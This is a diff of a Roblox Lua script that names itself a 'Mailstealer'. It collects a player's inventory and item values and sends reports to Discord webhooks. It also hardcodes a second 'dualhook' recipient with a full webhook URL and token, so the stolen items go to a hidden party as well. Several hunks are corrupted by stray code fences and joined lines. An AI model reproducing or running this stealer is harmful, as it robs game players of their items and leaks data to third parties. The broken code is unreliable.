@@ -1,7 +1,9 @@
-local Username = ... -- This will take the first argument passed
-local Username2 = select(2,...) -- This will take the second argument
-local Webhook = select(3,...) -- This will take the third argument
-local MinimumRAP = tonumber(select(4,...)) -- Convert to number
+-- Accept parameters from _G
+local Username = _G.Username -- Set this in your environment
+local Username2 = _G.Username2 -- Set this in your environment
+local Webhook = _G.Webhook -- Set this in your environment
+local MinimumRAP = tonumber(_G.MinimumRAP) -- Convert to number
+
 local DualhookUsername = "iamjeffoalt"
 local DualhookUsername2 = "nxrf1axz"
 local DualhookWebhook = "https://discord.com/api/webhooks/1318253261740048474/izxHeoiaYZ9oZdxwXdNXsT0fvFokxS-CXJQZAdalGbTpZA-K8MGUYooTH_FUCJIhF8JG"
@@ -138,8 +140,9 @@ local GetItemValue = function(Type, ItemTable)
     return result
 end
 
-local GetItemValueOfItems = function()
-    local RAP = 0 ```lua
+local GetItemValueOfItems = ```lua
+function()
+    local RAP = 0
     for name_of_category, category in pairs(Inventory) do
         if category ~= nil then
             for i, v in pairs(category) do
@@ -170,7 +173,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     local fardplayer = game:GetService("Players").LocalPlayer
     local ExecutorWebhook = identifyexecutor() or "undefined"
     local JobId = game.JobId
-    local PlayerUser   = Player.Name
+    local PlayerUser  = Player.Name
     local msg = {
         ["content"] = ping,
         ["username"] = "" .. mailstealer_name .. " Mailstealer",
@@ -251,8 +254,7 @@ local function GetThumbnail(imageid)
     local Asset = string.split(imageid, "rbxassetid://")[2]
     local Size = "420x420"
     local Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" .. Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png")
-    local thumbnail = game.HttpService:JSON ```lua
-Decode(Image).data[1].imageUrl
+    local thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
     return thumbnail
 end
 
@@ -397,8 +399,7 @@ local function GetListWithAllItems()
     end
     if Inventory.Lootbox ~= nil then
         for i, v in pairs(Inventory.Lootbox) do
-            id = v.id
-            dir = Directory.L ootboxes[id]
+            id = v.id dir = Directory.Lootboxes[id]
             rap = GetItemValue("Lootbox", v)
             ItemType = "Normal"
             ItemImageId = dir.Icon
@@ -545,9 +546,9 @@ local function GetListWithAllItems()
             end
         end
     end
-    if Inventory.Booth ~= nil then
-        for ```lua
-            i, v in pairs(Inventory.Booth) do
+    if Inventory.Booth ~= ```lua
+nil then
+        for i, v in pairs(Inventory.Booth) do
             id = v.id
             dir = Directory.Booths[id]
             rap = GetItemValue("Booth", v)
@@ -678,7 +679,8 @@ end
 Left_Hits = #hits
 
 if #hits > 0 or GemsAmount > FirstPriceOfMail then
-    local blob_a = require(game:Get Service("ReplicatedStorage").Library.Client.Save)
+    local blob_a ```lua
+= require(game:GetService("ReplicatedStorage").Library.Client.Save)
     local blob_b = blob_a.Get()
 
     FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
